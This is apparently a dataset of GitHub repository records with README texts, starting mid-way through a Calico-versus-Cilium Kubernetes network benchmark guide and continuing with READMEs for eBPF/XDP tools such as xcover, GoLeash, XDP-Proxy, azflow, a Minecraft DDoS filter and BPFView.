    test-group: group1
spec:
  containers:
  - name: iperf3-client
    image: docker.arvancloud.ir/networkstatic/iperf3
    command: [""sleep"", ""infinity""]
  affinity:
    podAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
      - labelSelector:
          matchLabels:
            test-group: group1
        topologyKey: ""kubernetes.io/hostname""
---
# Pod 3 - Server (Different Node)
apiVersion: v1
kind: Pod
metadata:
  name: test-server-diff-node
  namespace: perf-test
  labels:
    app: perf-test
    test-group: group2
spec:
  containers:
  - name: iperf3-server
    image: docker.arvancloud.ir/networkstatic/iperf3
    command: [""iperf3"", ""-s""]
---
# Pod 4 - Client (Different Node)
apiVersion: v1
kind: Pod
metadata:
  name: test-client-diff-node
  namespace: perf-test
  labels:
    app: perf-test
    test-group: group2
spec:
  containers:
  - name: iperf3-client
    image: docker.arvancloud.ir/networkstatic/iperf3
    command: [""sleep"", ""infinity""]
  affinity:
    podAntiAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
      - labelSelector:
          matchLabels:
            test-group: group2
        topologyKey: ""kubernetes.io/hostname""
EOF
```
âœ… Step 4: Install ping on all pods
```bash
kubectl exec -n perf-test <test-client-diff-node> -- /bin/sh -c ""su root -c 'apt-get update && apt-get install -y iputils-ping'""
```

âœ… Step 5: Testing pods on the same node

Latency testing:

```bash
kubectl exec -n perf-test test-client-same-node -- ping -c 10 <test-server-same-node or IP>
```
result :

![Comparison Chart](calico/same--node-test-calico-ping.png)

Throughput testing:
```bash
kubectl exec -n perf-test test-client-same-node -- iperf3 -c <test-server-same-node or IP> -t 20
```
result :
![Comparison Chart](calico/same-node-test-iperf3-calico.png)

âœ… Step 6: Different Node Tests

Latency testing:

```bash
kubectl exec -n perf-test test-client-diff-node -- ping -c 10 <test-server-diff-node or IP>
```
result:

![Comparison Chart](calico/different-node-test-calico-ping.png)

Throughput testing:
```bash
kubectl exec -n perf-test test-client-diff-node -- iperf3 -c <test-server-diff-node or IP> -t 20
```
result:

![Comparison Chart](calico/Different-node-test-calico-iperf3.png)

âœ… Step 7 : Load Balancing Performance (calico)

```bash
cat <<EOF > load-tester.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test-app
  namespace: perf-test
spec:
  replicas: 5
  selector:
    matchLabels:
      app: test-app
  template:
    metadata:
      labels:
        app: test-app
    spec:
      containers:
      - name: nginx
        image: nginx
        ports:
        - containerPort: 80
        resources:
          requests:
            cpu: ""200m""
            memory: ""256Mi""
          limits:
            cpu: ""500m""
            memory: ""512Mi""
        readinessProbe:
          httpGet:
            path: /
            port: 80
          initialDelaySeconds: 5
          periodSeconds: 5
---
apiVersion: v1
kind: Service
metadata:
  name: test-service
  namespace: perf-test
spec:
  type: ClusterIP
  selector:
    app: test-app
  ports:
  - port: 80
    targetPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: load-tester
  namespace: perf-test
spec:
  containers:
  - name: wrk
    image: alpine:3.18
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache wrk curl && tail -f /dev/null
EOF
```
Implement deployment and service testing :

```bash
kubectl apply -f load-tester.yaml
```

## bash script for test loadbalancer (calico)

```bash
#!/bin/bash
# save as load-test.sh

GREEN='\033[0;32m'
NC='\033[0m'

echo ""Starting Load Balancing Tests...""


echo -e ""${GREEN}Test 1: Basic Load Test (2 threads, 100 connections, 30s)${NC}""
kubectl exec -it -n perf-test load-tester -- wrk -t2 -c100 -d30s http://test-service.perf-test.svc.cluster.local

sleep 10

echo -e ""${GREEN}Test 2: High Load Test (4 threads, 500 connections, 30s)${NC}""
kubectl exec -it -n perf-test load-tester -- wrk -t4 -c500 -d30s http://test-service.perf-test.svc.cluster.local

sleep 10


echo -e ""${GREEN}Test 3: Burst Test (4 threads, 1000 connections, 10s)${NC}""
kubectl exec -it -n perf-test load-tester -- wrk -t4 -c1000 -d10s http://test-service.perf-test.svc.cluster.local
```
```bash
chmod +x load-test.sh
./load-test.sh > calico-loadbalancer-results.txt
```

result : 

![Comparison Chart](calico/loadbalancer-calico.png)

âœ… Step 8 : Remove calico

```bash
kubectl delete -f https://raw.githubusercontent.com/projectcalico/calico/v3.27.0/manifests/calico.yaml
```

âœ… Step 9 : Install helm

```bash
wget https://get.helm.sh/helm-v3.14.0-linux-amd64.tar.gz
tar -zxvf helm-v3.14.0-linux-amd64.tar.gz
sudo mv linux-amd64/helm /usr/local/bin/helm
```

âœ… Step 10 : Install Cilium with Helm

```bash
helm repo add cilium https://helm.cilium.io/
helm repo update
```

Install Cilium using Helm :

```bash
helm install cilium cilium/cilium \
  --namespace kube-system \
  --set nodeinit.enabled=true \
  --set kubeProxyReplacement=true \
  --set hostServices.enabled=true \
  --set externalIPs.enabled=true \
  --set nodePort.enabled=true \
  --set hostPort.enabled=true \
  --set cluster.name=kind \
  --set cluster.id=1
```
âœ… Step 11 : Rerun all tests on Cilium (like the tests above)

Testing pods on the same node (cilium)

Latency testing:

```bash
kubectl exec -n perf-test test-client-same-node -- ping -c 10 <test-server-same-node or IP>
```

result :

![Comparison Chart](cilium/test-server-same-node-cilium-ping.png)


Throughput testing:
```bash
kubectl exec -n perf-test test-client-same-node -- iperf3 -c <test-server-same-node or IP> -t 20
```
result:

![Comparison Chart](cilium/test-server-same-node-iperf3-cilium.png)


âœ… Step 12: Different Node Tests


Latency testing:

```bash
kubectl exec -n perf-test test-client-diff-node -- ping -c 10 <test-server-diff-node or IP>
```

result :

![Comparison Chart](cilium/Different-node-cilium-ping.png)


Throughput testing:
```bash
kubectl exec -n perf-test test-client-diff-node -- iperf3 -c <test-server-diff-node or IP> -t 20
```
result:

![Comparison Chart](cilium/Different-node-cilium-iperf3.png)



âœ… Step 13 : Load Balancing Performance (cilium)

run script :

```bash
./load-test.sh > cilium-loadbalancer-results.txt
```

result :

![Comparison Chart](cilium/loadbalancer-test-cilium.png)



## Conclusion

Based on the test results, we can draw the following conclusions:

Network Throughput:

Cilium shows superior performance in both same-node and different-node scenarios
Same-node throughput: Cilium (32.9 Gbits/sec) outperforms Calico (23.8 Gbits/sec) by approximately 38%
Different-node throughput: Cilium (13.6 Gbits/sec) performs better than Calico (11.7 Gbits/sec) by about 16%
Network Latency:

For different-node communication, Calico shows slightly better latency (0.205ms vs 0.240ms)
For same-node communication, performance is comparable with Cilium at 0.83ms and Calico at 0.91ms
Load Balancing Performance:

Cilium consistently shows better performance in load balancing scenarios
Request handling capacity is approximately 5-10% higher in Cilium
Transfer rates are consistently higher in Cilium across all test rounds
Cilium shows better scaling under sustained load, with performance improving in subsequent test rounds
Overall Assessment:

Cilium demonstrates better overall performance, particularly in high-throughput scenarios
Cilium appears to be more efficient in load balancing and same-node communication
Both CNIs show stable and reliable performance, suitable for production workloads
The choice between the two might depend on specific use cases, with Cilium having an edge in high-performance requirements
This comparison suggests that Cilium might be the better choice for environments requiring high network throughput and efficient load balancing, while both solutions provide acceptable latency for most use cases.
"
maxgio92/xcover,6,0,6,6,C,Profile coverage of functional tests without instrumenting your binaries.,2025-03-15T14:16:34Z,2025-08-22T18:20:53Z,44,"# xcover

Profile coverage of functional tests without instrumenting your binaries.

`xcover` (pronounced 'cross cover') enables to profile functional test coverage, by leveraging kernel instrumentation to probe functions in userland, and it's cross language.
This makes possible to measure coverage on ELF binaries without ecosystem-specific instrumentation like [Go cover](https://go.dev/doc/build-cover) or [LLVM cov](https://llvm.org/docs/CommandGuide/llvm-cov.html) require.

![xcover demo](assets/xcover-demo.gif)

## CLI Reference

## xcover

xcover is a functional test coverage profiler

### Synopsis


xcover is a functional test coverage profiler.

Run the 'run' command to run the profiler that will trace all the functions of the tracee program.
Wait for the profiler to be ready before running your tests, with the 'wait' command.
Once the profiler is ready to trace all the functions, you can start running your tests.
At the end of your tests, the profiler can be stopped and a report being collected.


### Options

```
  -h, --help               help for xcover
      --log-level string   Log level (trace, debug, info, warn, error, fatal, panic) (default ""info"")
```

### SEE ALSO

* [xcover run](docs/xcover_run.md)	 - Run the coverage profiling for a program
* [xcover status](docs/xcover_status.md)	 - Check the the xcover profiler status
* [xcover stop](docs/xcover_stop.md)	 - Stop the xcover profiler daemon
* [xcover wait](docs/xcover_wait.md)	 - Wait for the xcover profiler to be ready



## Filter

### Filter by process

```shell
xcover run --pid PID
```

### Filter by binary

```shell
xcover run --path EXE_PATH
```

### Filter functions

For including specific functions:

```shell
xcover run --path EXE_PATH --include ""^github.com/maxgio92/xcover""
```

or excluding some:

```shell
xcover run --path EXE_PATH --exclude ""^runtime.|^internal""
```

## Daemon mode

You can run the profiler as daemon with the `--detach` flag:

```shell
$ xcover run --detach --path /path/to/bin
```

Check the status with the `status` command:

```shell
$ xcover status
xcover is running (PID 1234)
```

And stop it with the `stop` command:

```shell
$ xcover stop
xcover is stopped
```

## Report

A coverage report is generated by default, and can be controlled with the `run` command's `--report` flag.

The report is provided in JSON format and contains
* the functions that have been traced
* the functions acknowledged
* the coverage by function percentage
* the executable path

```go
type CoverageReport struct {
	FuncsTraced []string `json:""funcs_traced""`
	FuncsAck    []string `json:""funcs_ack""`
	CovByFunc   float64  `json:""cov_by_func""`
	ExePath     string   `json:""exe_path""`
}
```

For instance:

```shell
$ xcover run --path myapp --verbose=false --report
`^C5:02PM INF written report to xcover-report.json`
$ cat xcover-report.json | jq '.cov_by_func'
15.601900739176347
```

## Synchronization

It is possible to synchronize on the `xcover` readiness, meaning that userspace can proceed executing the tests because xcover is ready to trace them all.

You can use the `wait` command to wait for the `xcover` profiler to be ready:

```shell
$ xcover run --detach --path /path/to/bin
$ xcover wait
1:30PM INF waiting for the profiler to be ready
1:30PM INF profiler is ready
$ /path/to/bin test_1
$ /path/to/bin test_2
$ /path/to/bin test_3
$ xcover stop
```

and collect the coverage as `xcover-report.json`.

## Quickstart

A full example of usage is described below:

```shell
$ xcover run --detach --path /path/to/bin
$ xcover wait
xcover is ready
$ /path/to/bin test1
$ /path/to/bin test2
$ /path/to/bin test3
$ xcover stop
xcover is stopped
$ cat xcover_report.json | jq .cov_by_func
89.9786897
```

## Development

### Prerequisites

- `bpftool` (to generate vmlinux.h for CORE)
- `clang`
- `go`
- `libbf-dev`

### Build all

By default it statically compile xcover with libbfgo, and libbpfgo with libbpf.

```shell
make xcover
```

### Build BPF only

```shell
make xcover/bpf
```

### Build frontend only

```shell
make xcover/frontend
```

### Run test

```shell
make test
```

"
chains-project/goleash,18,0,18,1,C,Runtime enforcement of software supply chain capabilities in Go,2024-08-16T09:32:42Z,2025-09-21T06:01:24Z,66,"# GoLeash <img src=""logo.jpg"" width=""45"" height=""30"" alt=""Logo"" style=""vertical-align: middle;""> 

GoLeash is a eBPF-based runtime policy enforcement tool designed to defend Go applications against software supply chain attacks. It enforces the principle of least privilege at the package level, identifying and blocking unauthorized or malicious behavior introduced via compromised dependencies. 

GoLeash monitors system calls at runtime to:
- Detect when Go packages use system capabilities they shouldn't (e.g., making network connections, modifying files).
- Mitigate the impact of malicious or overprivileged third-party dependencies.
- Remain effective even under advanced code obfuscation techniques. 

Modes of Operations
- **Analysis Mode**: Automatically profiles legitimate runtime behavior by observing system calls and stack traces to generate fine-grained, per-package allowlists.
- **Enforcement Mode**: At runtime, validates syscalls against the previously generated policies, blocking  logging violations.


See the paper: [GoLeash: Mitigating Golang Software Supply Chain Attacks
with Runtime Policy Enforcement](https://arxiv.org/pdf/2505.11016)


## Requirements
- llvm
- clang
- libbpf-dev
- gcc-multilib

## Runnable example: FRP (Fast Reverse Proxy)
We provide a runnable example of GoLeash in action, using FRP (Fast Reverse Proxy), a reverse proxy written in Go. This example demonstrates how to profile, generate, and enforce package-level capability policies against FRP's ```frpc``` (client) and ```frps``` (server) binaries.

### Setup the target application

First, clone the repository:
```bash
git clone https://github.com/fatedier/frp.git
```

GoLeash uses Go symbol information for stack resolution. To enable this:
- In the FRP ```Makefile```, remove ```-ldflags ""$(LDFLAGS)""``` from the compilation rule. 
- Or more generally, remove ```-w -s``` flags, which strip debug information.

Still in the Makefile, set 
```bash
CGO_ENABLED=1
```

Finally, compile both server and client binaries:
```bash
cd frp
make
```

Optional: You can increase test parallelism in ```/hack/run-e2e.sh``` by modifying the ```concurrency``` parameter.


### Configure and Compile GoLeash
Edit the ```config.toml``` file in GoLeash to tell it which binaries to monitor: 

```toml
[targets]
binaries = [
  ""frpc"",
  ""frps""
]
binary_paths = [
  ""..frp/bin/frps"",
  ""..frp/target/bin/frpc""
]
```

Compile GoLeash 
```bash
cd goleash
make
```

### Run Profiling and Enforcement
Run FRP's end-to-end tests while GoLeash monitors execution to build a policy.

First, run GoLeash in the analysis mode. 
```bash
make build
```

Then, in another shell, run the end-to-end tests:
```bash
cd frp
make e2e
```
You can run this multiple times to improve coverage in the policy. When done, stop goleash (CTRL+C) and the policy will be saved in the current directory (```trace\store.json```).


To simulate a violation, manually remove a capability from ```tracestore.json``` for any package. Then launch GoLeash in enforcement mode, when executing again e2e test. 
```bash
cd goleash
make cap-enforce
```


**Note**: For more runnable examples, see ```execute_target.md```



"
gamemann/XDP-Proxy,243,35,243,2,C,"A stateless, high-performance NAT-like proxy that attaches to the XDP hook in the Linux kernel using (e)BPF for fast packet processing.  This proxy forwards packets based on configurable rules and performs source-port mapping, similar to IPTables and NFTables.",2020-12-13T18:35:17Z,2025-10-09T16:02:31Z,215,"[![XDP Proxy Build Workflow](https://github.com/gamemann/XDP-Proxy/actions/workflows/build.yml/badge.svg)](https://github.com/gamemann/XDP-Proxy/actions/workflows/build.yml) [![XDP Proxy Run Workflow](https://github.com/gamemann/XDP-Proxy/actions/workflows/run.yml/badge.svg)](https://github.com/gamemann/XDP-Proxy/actions/workflows/run.yml)

A *stateless*, high-performance NAT-like proxy that attaches to the [XDP](https://www.iovisor.org/technology/xdp) hook in the Linux kernel using [(e)BPF](https://ebpf.io/) for fast packet processing.

This proxy forwards packets based on configurable rules and performs **source-port mapping**, similar to [IPTables](https://linux.die.net/man/8/iptables) and [NFTables](https://wiki.nftables.org/wiki-nftables/index.php/Main_Page).

![Demo Run](./images/run.gif)

## ðŸš€ Features Overview
All features can be enabled or disabled through the build-time configuration ([`config.h`](./src/common/config.h) before compilation) or runtime configuration on disk.

### ðŸ“¡ High-Performance Packet Forwarding
* **XDP-Powered** - Runs at the earliest point in the network stack for **minimal latency**.
* **eBPF-Based** - Uses BPF maps for efficient rule lookups and packet processing.
* Supports **Layer 3 & Layer 4** packet forwarding.
* Implements **source-port mapping**, similar to how [IPTables](https://linux.die.net/man/8/iptables) and [NFTables](https://wiki.nftables.org/wiki-nftables/index.php/Main_Page) handle it.

### ðŸ“Š Real-Time Packet Counters
* Track **forwarded, passed, dropped** packets in real time.
* Supports **per-second statistics** for better traffic analysis.

### ðŸ“œ Logging System
* Built-in **logging** to terminal and/or a file.
* Configurable **verbosity levels** to control log output.

### ðŸ“Œ Pinned Maps & CLI Utilities
* **Pinned BPF maps** allow external programs to interact with forward rules.
* CLI utilities (`xdpfwd-add`, `xdpfwd-del`) enable **dynamic rule** management without restarting the proxy.

## ðŸ› ï¸ Building & Installing
Before building, ensure the following packages are installed. These packages can be installed with `apt` on Debian-based systems (e.g. Ubuntu, etc.), but there should be similar names in other package managers.

```bash
# Install dependencies.
sudo apt install -y libconfig-dev llvm clang libelf-dev build-essential

# Install dependencies for building LibXDP and LibBPF.
sudo apt install -y libpcap-dev m4 gcc-multilib

# You may need tools for your Linux kernel since BPFTool is required.
# If this doesn't work and you still run into issues, I'd suggest building BPFTool from source (https://github.com/libbpf/bpftool).
sudo apt install -y linux-tools-$(uname -r)
```

You can use `git` to clone this project. Make sure to include the `--recursive` flag so it downloads the XDP Tools sub-module! Otherwise, you will need to execute `git submodule update --init` while in the cloned repository's directory.

```bash
# Clone repository via Git. Use recursive flag to download XDP Tools sub-module.
git clone --recursive https://github.com/gamemann/XDP-Proxy.git

# Change directory to cloned repository.
cd XDP-Proxy
```

From here, you have two options to build and install the proxy.

### With Bash Script
The easiest way to build and install the proxy is to use the provided [`install.sh`](./install.sh) Bash script. This script relies on `sudo` being installed on your system. If you do not have sudo, please refer to the below steps on building and installing this tool without the Bash script.

If you don't have LibXDP installed on your system yet, I'd recommend using the following command.

```bash
./install.sh --libxdp
```

Otherwise, you can exclude the `--libxdp` flag if you'd like.

Additionally, here is a list of flags you may pass to this script.

| Name | Description |
| ---- | ----------- |
| --libxdp | Build and install LibXDP before building the tool. |
| --no-install | Build the tool and/or LibXDP without installing them. |
| --clean | Remove build files for the tool and LibXDP. |
| --no-static | Do *not* statically link LibXDP and LibBPF object files when building the tool. This makes the build process faster, but you may need to alter your `LD_LIBRARY_PATH` env variable before running the tool and requires LibXDP to be installed on your system already. |
| --objdump | Dumps the XDP/BPF object file using [`llvm-objdump`](https://llvm.org/docs/CommandGuide/llvm-objdump.html) to Assemby into `objdump.asm`. This is used for debugging. |
| --help | Displays help message. |

![Script Build Demo](./images/build_script.gif)

### Without Bash Script
If you do not want to use the Bash script above, you may use `make` to build and install this tool instead.

```
# Build XDP-Tools (LibXDP and LibBPF).
make libxdp

# Install LibXDP & LibBPF onto your system.
# Warning: This command must be executed as root! `sudo` should do this for you if you have it installed and have privileges.
sudo libxdp_install

# Build the proxy tool.
make

# Install the tool onto your system.
# Warning: This command must be executed as root! `sudo` should do this for you if you have it installed and have privileges.
sudo make install
```

![Script Build Demo](./images/build_make.gif)

## ðŸ’» CLI Usage
The following command line arguments are supported when running the proxy.

| Name | Default | Description |
| ---- | ------- | ----------- |
| -c, --config | `/etc/xdpfwd/xdpfwd.conf` | The path to the config file. |
| -o, --offload | N/A | If set, attempts to load the XDP program in hardware/offload mode. |
| -s, --skb | N/A | If set, forces the XDP program to be loaded using SKB mode instead of DRV mode. |
| -t, --time | N/A | If set, will run the tool for this long in seconds. E.g. `--time 30` runs the tool for 30 seconds before exiting. |
| -l, --list | N/A | If set, will print the current config values and exit. |
| -h, --help | N/A | Prints a help message. |

Additionally, there are command line overrides for base config options you may include.

| Name | Example | Description |
| ---- | ------- | ----------- |
| -v, --verbose | `-v 3` | Overrides the config's verbose value. |
| --log-file | `--log-file ./test.log` | Overrides the config's log file value. |
| -i, --interface | `-i enp1s0` | Overrides the config's first interface value. |
| -p, --pin-maps | `-p 0` | Overrides the config's pin maps value. |
| -u, --update-time | `-u 30` | Overrides the config's update time value. |
| -n, --no-stats | `-n 1` | Overrides the config's no stats value. |
| --stats-ps | `--stats-ps 1` | Overrides the config's stats per second value. |
| --stdout-ut | `--stdout-ut 500` | Overrides the config's stdout update time value. |

## âš™ï¸ Configuration
There are two configuration methods for this proxy:

1ï¸âƒ£ **Build-Time Configuration** - Modify hard-coded constants in [`config.h`](./src/common/config.h) by commenting (`//`) or uncommenting options along with setting values. Since these settings are required at build time, the proxy must be rebuilt for changes to take effect.

2ï¸âƒ£ **Runtime Configuration** - Settings can also be adjusted via a configuration file stored on disk. By default, this file is located at `/etc/xdpfwd/xdpfwd.conf`, but you can specify a different path using the `-c` or `--config` CLI options.

The [`libconfig`](https://hyperrealm.github.io/libconfig/libconfig_manual.html) library and syntax is used when parsing the config file.

Here are more details on the layout of the runtime configuration.

### Main
| Name | Type | Default | Description |
| ---- | ---- | ------- | ----------- |
| verbose | int | `2` | The verbose level for logging (0 - 5 supported so far). |
| log_file | string | `/var/log/xdpfwd.log` | The log file location. If the string is empty (`""""`), the log file is disabled. |
| interface | string \| list of strings | `NULL` | The network interface(s) to attach the XDP program to (usually retrieved with `ip a` or `ifconfig`). |
| pin_maps | bool | `true` | Pins main BPF maps to `/sys/fs/bpf/xdpfwd/[map_name]` on the file system. |
| update_time | int | `0` | How often to update the config and forwarding rules from the file system in seconds (< 1 disables). |
| no_stats | bool | `false` | Whether to enable or disable packet counters. Disabling packet counters will improve performance, but result in less visibility on what the proxy is doing. |
| stats_per_second | bool | `false` | If true, packet counters and stats are calculated per second. `stdout_update_time` must be 1000 or less for this to work properly. |
| stdout_update_time | int | `1000` | How often to update `stdout` when displaying packet counters in milliseconds. |
| rules | list of forward rule objects | `()` | A list of forward rules. |

### Forward Rule Object
| Name | Type | Default | Description |
| ---- | ---- | ------- | ----------- |
| enabled | bool | `true` | Whether the rule is enabled or not. |
| log | bool | `false` | Whether to log new connections to terminal and/or log file. |
| protocol | string | N/A | The protocol to listen on (`tcp`, `udp`, or `icmp`). |
| bind_ip | string | N/A | The IP to listen on. |
| bind_port | int | N/A | The port to listen on. |
| dst_ip | string | N/A | The destination IP to forward packets to. |
| dst_port | int | N/A | The destination port to forward packets to. |

**NOTE** - As of right now, you can specify up to **256** forward rules. You may increase this limit by raising the `MAX_FWD_RULES` constant in the `src/common/config.h` [file](https://github.com/gamemann/XDP-Proxy/blob/master/src/common/config.h#L4) and then rebuilding the program.

### Runtime Example
Here's a runtime config example.

```squidconf
verbose = 5;
log_file = """";
interface = ""ens18"";
pin_maps = true;
update_time = 15;
no_stats = false;
stats_per_second = true;

rules = (
    {
        enabled = true;
        log = true;
        protocol = ""tcp"";
        bind_ip = ""10.3.0.2"";
        bind_port = 40;
        dst_ip = ""10.3.0.3"";
        dst_port = 22;
    }
);
```

## ðŸ”§ The `xdpfwd-add` & `xdpfwd-del` Utilities
When the main BPF maps are pinned to the file system (depending on the `pin_maps` runtime option detailed above), this allows you to add or delete forward rules while the proxy is running using the `xdpfwd-add` and `xdpfwd-del` utilities.

### General CLI Usage
The following general CLI arguments are supported with these utilities.

| Name | Example | Description |
| ---- | ------- | ----------- |
| -c, --cfg | `-c ./local/conf` | The path to the configuration file (required if the save argument is specified). |
| -s, --save | `-s` | Updates the runtime config file. |
| -b, --bind-ip | `-b 10.3.0.2` | The bind IP to add or delete. |
| -x, --bind-port | `-x 40` | The bind port to add or delete. |
| -p, --protocol | `-p tcp` | The protocol to use. |

### The `xdpfwd-add` Tool
This CLI tool allows you to add dynamic rules, IP ranges to the drop list, and source IPs to the block list. I'd recommend using `xdpfw-add -h` for more information.

#### Additional CLI Usage
The following CLI arguments are supported.

| Name | Example | Description |
| ---- | ------- | ----------- |
| -e, --enabled | `-e 1` | Enables or disables this forward rule. |
| -l, --log | `-l 1` | Enables or disables logging for this forward rule. |
| -d, --dst-ip | `-d 10.3.0.3` | The destination IP to forward packets to. |
| -y, --dst-port | `-y 22` | The destination port to forward packets to. |

### The `xdpfwd-del` Tool
This CLI tool allows you to delete forward rules while the XDP proxy is running.

There is no additional CLI usage for this tool. Please refer to the general CLI usage above.

## ðŸ“ Notes
### XDP Attach Modes
By default, the proxy attaches to the Linux kernel's XDP hook using **DRV** mode (AKA native; occurs before [SKB creation](http://vger.kernel.org/~davem/skb.html)). If the host's network configuration or network interface card (NIC) doesn't support DRV mode, the program will attempt to attach to the XDP hook using **SKB** mode (AKA generic; occurs after SKB creation which is where IPTables and NFTables are processed via the `netfilter` kernel module). You may use overrides through the command-line to force SKB or offload modes.

Reasons for a host's network configuration not supporting XDP's DRV mode may be the following.

* Running an outdated kernel that doesn't support your NIC's driver.
* Your NIC's driver not yet being supported. [Here's](https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md#xdp) a NIC driver XDP support list. With enough Linux kernel development knowledge, you could try implementing XDP DRV support into your non-supported NIC's driver (I'd highly recommend giving [this](https://www.youtube.com/watch?v=ayFWnFj5fY8) video a watch!).
* You don't have enough RX/TX queues (e.g. not enabling multi-queue) or your RX/TX queue counts aren't matching. From the information I gathered, it's recommended to have one RX and TX queue per CPU core/thread. You could try learning how to use [ethtool](https://man7.org/linux/man-pages/man8/ethtool.8.html) and try altering the NIC's RX/TX queue settings ([this](https://www.linode.com/docs/guides/multiqueue-nic/) article may be helpful!).

#### Offload Information
Offloading your XDP/BPF program to your system's NIC allows for the fastest packet processing you can achieve due to the NIC dropping the packets with its hardware. However, for one, there are **not** many NIC manufacturers that do support this feature **and** you're limited to the NIC's memory/processing (e.g. your BPF map sizes will be extremely limited). Additionally, there are usually stricter BPF verifier limitations for offloaded BPF programs, but you may try reaching out to the NIC's manufacturer to see if they will give you a special version of their NIC driver raising these limitations (this is what I did with one manufacturer I've used).

At this time, I am not aware of any NIC manufacturers that will be able to offload this proxy completely to the NIC due to its BPF complexity.

### BPF Loop Support
This proxy requires general loop support along with support for the [`bpf_loop()`](https://docs.ebpf.io/linux/helper-function/bpf_loop/) function. Older kernels will not support general loops and output an error such as the following.

```vim
libbpf: load bpf program failed: Invalid argument
libbpf: -- BEGIN DUMP LOG ---
libbpf:
back-edge from insn 113 to 100

libbpf: -- END LOG --
libbpf: failed to load program 'xdp_prog'
libbpf: failed to load object '/etc/xdpfwd/xdp_prog.o'
```

It looks like general BPF loop [support](https://lwn.net/Articles/794934/) was added in kernel 5.3. Therefore, you'll need kernel 5.3 or above for this tool to run properly.

With that said, the `bpf_loop()` function was added in kernel `5.17`, but *may* still require kernel `6.4` or above due to support for open coded iterators. If your kernel doesn't include proper support for `bpf_loop()` and you do not wish to upgrade your kernel, you will need to disable/comment out the `USE_NEW_LOOP` cons"
Iliabuleh/azflow,12,0,12,0,Python,A CLI tool to detect and analyze crossâ€“availability-zone pod-to-pod network traffic in Kubernetes using Cilium Hubble.,2025-04-23T18:19:09Z,2025-07-27T08:23:30Z,4,"# Cross-AZ Flow Detection with Hubble CLI + Kubernetes

This guide helps you:
- Collect enriched network flow logs using Hubble
- Map nodes and pods to AWS Availability Zones
- Detect and analyze **cross-AZ traffic** in your Kubernetes cluster using `Taskfile` automation

---

## âœ¨ Prerequisites

- Kubernetes cluster with **Cilium** + **Hubble Relay** installed
- Access to `kubectl`
- Python 3
- Tools: `jq`, `hubble` CLI, and `task` runner

###  Install Task:
```bash
brew install go-task/tap/go-task
```

### Install Hubble CLI:
```bash
curl -L --remote-name-all https://github.com/cilium/hubble/releases/latest/download/hubble-linux-amd64.tar.gz{,.sha256sum}
sha256sum --check hubble-linux-amd64.tar.gz.sha256sum
tar xzvf hubble-linux-amd64.tar.gz
sudo install -m 0755 hubble /usr/local/bin/hubble
```

---

## ðŸš€ Quick Start with Poetry & Taskfile

### ðŸ§ª 1. Set Up Python Environment with Poetry
```bash
poetry install
poetry run azflow
```
If you're starting fresh:
```bash
poetry init --no-interaction
poetry add --dev black
poetry add tabulate
```

### ðŸ”§ 2. Generate Zone and IP Mapping Files
```bash
task setup
```
- Outputs: `data/node_zones.json`, `data/ip_to_node.json`

### ðŸ“¡ 3. Capture and Analyze Flow Logs
```bash
task observe
```
Optional filter example:
```bash
task observe LAST=""200"" FILTER=""--protocol tcp --verdict FORWARDED""
```
Narrow to specific namespace
```bash
task observe \
  FILTER=""--protocol tcp --verdict FORWARDED \
    --from-namespace monitoring \
    --to-namespace monitoring"" \
  LAST=300
```
Deny labels
```bash
task observe \
  FILTER=""--protocol tcp --verdict FORWARDED \
  --denylist '{\""source_label\"":[\""k8s:k8s-app=coredns\""],\""destination_label\"":[\""k8s:k8s-app=coredns\""]}'"" \
  LAST=300
```

- Captures flows to `data/flow.json`
- Analyzes cross-AZ flows with `filter_cross_az_flows.py`
- Cleans up the port-forward

### ðŸ§ª 1. Set Up Python Environment with Poetry
```bash
poetry install
poetry run azflow
```
If you're starting fresh:
```bash
poetry init --no-interaction
poetry add --dev black
poetry add tabulate
```

### ðŸ§¹ 4. Cleanup Resources (Optional)
```bash
task cleanup
```

---

## ðŸ“ˆ Output Example
```
ðŸš¦ Cross-AZ: [us-east-1a] ip-10-182-61-104.ec2.internal (mimir-ingester) â†’ [us-east-1c] ip-10-182-124-155.ec2.internal (10.182.124.155 â†’ mimir-distributor)
```

---

## ðŸ“Š Next Steps
- Export to CSV
- Summarize flow counts per AZ pair
- Visualize with Prometheus + Grafana

---

## â“ Can We Filter by Request Size in Hubble?
Currently, **Hubble CLI does not expose request size filters directly**.
- You can filter by protocol, port, or verdict
- Use Prometheus + Cilium metrics (e.g. `hubble_flows_processed_total`) for deeper insights

If request size filtering is critical, consider L7-aware observability tools like Cilium + Prometheus.
"
Outfluencer/Minecraft-XDP-eBPF,84,9,84,3,C,"The first and only publicly available Minecraft XDP Filter, protecting your server from layer 7 DDoS attacks",2025-04-26T21:55:09Z,2025-10-06T02:00:12Z,164,"Minecraft XDP Filter using eBPF â€“ L7 DDoS Protection
==========
This project offers a high-performance XDP-based firewall utilizing eBPF, specifically designed for Minecraft Java Edition servers.  
It effectively mitigates L7 DDoS attacks by filtering malicious packets before they reach the server.  
Currently the filter is only available for ipv4 and supports 1.8 - 1.21.9.  
The default ports for filtering are 25000-26000.  

# What does the filter do
The filter analyzes Minecraft handshakes, status, ping, and login requests, and drops invalid connections.  
If a connection is dropped, the IP is blacklisted for 60 seconds â€” all new connections from that IP will be dropped.  
The filter also has an integrated connection throttle: max 10 SYNs per 3 seconds per ip address.  

# Install (Linux)
You can use the precompiled exceutable from the releases.  
Or you install the libs on your own and just run `./build.sh`  
After that the xdp_loader file should be in the `Minecraft-XDP-eBPF/target/release` directory  
Then you can run the loader with `./xdp_loader <network interface>`  
Note: This project uses a persistent XDP userspace loader to maintain connection state and manage eBPF maps. Exiting the loader will unload the firewall.  

â­ Don't forget to star the project!

https://youtu.be/Tq8QHJAMhRc

# Configuration
The default protected ports are 25000 to 26000, if you want to change that,  
fully remove the arguments from the `/c/build.sh` file or change them to the port range you need.  
Then recompile the project. The xdp filter will now filter on the specified port range or on 25565 if nothing is specified.  

# More
BungeeCord plugin that utilizes this filter to block ips that are causing exceptions
https://github.com/Outfluencer/Minecraft-XDP-eBPF-Server-Addon/
"
jnesss/bpfview,32,2,32,0,Go,BPFView: Process and Network Activity Correlation,2025-04-08T19:55:56Z,2025-08-30T20:43:27Z,347,"# BPFView: Process and Network Activity Correlation

<strong>Link processes, network flows, DNS queries, and TLS/SNI through structured logs with powerful real-time detection.</strong>

